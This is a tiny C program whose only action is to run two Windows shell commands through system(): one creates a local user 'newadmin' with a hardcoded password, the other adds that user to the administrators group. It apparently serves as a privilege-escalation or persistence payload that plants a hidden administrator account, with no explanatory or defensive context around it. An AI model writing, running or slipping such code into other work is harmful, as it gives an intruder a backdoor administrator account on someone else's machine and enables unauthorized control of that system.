#include <stdlib.h>

int main ()
{
  int i;
  i = system ("net user newadmin password123! /add");
  i = system ("net localgroup administrators newadmin /add");

  return 0;
}
